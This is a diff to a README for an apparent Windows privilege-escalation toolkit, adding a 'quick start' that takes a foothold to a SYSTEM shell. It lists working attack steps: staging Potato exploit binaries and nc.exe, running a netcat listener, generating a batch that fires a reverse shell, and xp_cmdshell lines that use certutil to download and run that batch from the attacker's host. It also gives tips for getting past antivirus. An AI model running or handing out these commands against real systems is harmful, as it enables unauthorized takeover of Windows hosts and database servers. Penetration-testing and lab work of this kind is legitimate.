@@ -1,6 +1,47 @@
 # Windows privesc toolkit — Potato · service · DLL · SeBackup
 
-**Foothold on a Windows target · attacker 10.0.0.10 · goal: SYSTEM (or a local/domain admin).**
+**Foothold on a Windows target · goal: SYSTEM (or a local/domain admin).**
+
+## 🚀 5-minute quick start — one paste to a SYSTEM shell
+
+If your foothold holds **SeImpersonatePrivilege** (any MSSQL service account, IIS AppPool, most service accounts — check with `whoami /priv`), you can go from foothold → SYSTEM in one command from your Kali box and one paste on target.
+
+```bash
+# 1) Kali: put every Potato exe you have (bring your own — see ../SUPPLIED-BINARIES.md)
+#    plus nc.exe in one folder:
+mkdir -p ~/potatoes
+cp GodPotato-NET4.exe EfsPotato.exe SharpEfsPotato.exe nc.exe ~/potatoes/
+
+# 2) Kali: start your listener + serve the folder:
+nc -lvnp 443 &
+cd ~/potatoes && sudo python3 -m http.server 80 &
+
+# 3) Kali: generate ONE batch that stages every Potato, scans them, picks the
+#    winner, and fires the SYSTEM revshell (auto-picks nc mode when nc.exe is there):
+python3 <path-to-Skoll>/winpriv/winpriv.py --lhost YOUR_IP --lport 443 --potatoes ~/potatoes --fire > ~/potatoes/run.bat
+
+# 4) Target: paste this in mssqlclient (any xp_cmdshell channel works):
+```
+```sql
+EXEC master..xp_cmdshell 'certutil -urlcache -f http://YOUR_IP/run.bat C:\Windows\Temp\run.bat';
+EXEC master..xp_cmdshell 'C:\Windows\Temp\run.bat';
+```
+
+That's it. Your nc listener catches a SYSTEM shell. No config file edits, no picking the right Potato variant, no picking the right delivery script.
+
+**If it doesn't work**, the batch's own output tells you why:
+- `[TRIED via certutil: exit=0 bytes=0]` = AV nuked the download → try `--transport curl` or `--verbose` to see the real error.
+- `[FAILED after every transport]` = that specific exe is signatured on this box → rebuild from source (see `../SUPPLIED-BINARIES.md`) or leave it out.
+- `[-] TOOL no marker written` = that Potato's callback path is dead here (very common on patched boxes) — the batch keeps trying the others.
+- `NO Potato won SYSTEM` = your foothold likely doesn't hold SeImpersonate; run `whoami /priv` and see the routes below.
+
+Full flags: `python3 winpriv/winpriv.py --help` (or open `winpriv/winpriv.py` — beginner flags at the top of the docstring, advanced flags below).
+
+---
+
+## Route map (all the other cases)
+
+**Foothold on a Windows target · attacker 10.0.0.10.**
 Which route fits is decided by `whoami /priv`, `whoami /groups`, and a service/DLL enum — see STEP 0.
 
 ## How these scripts work (read this first)
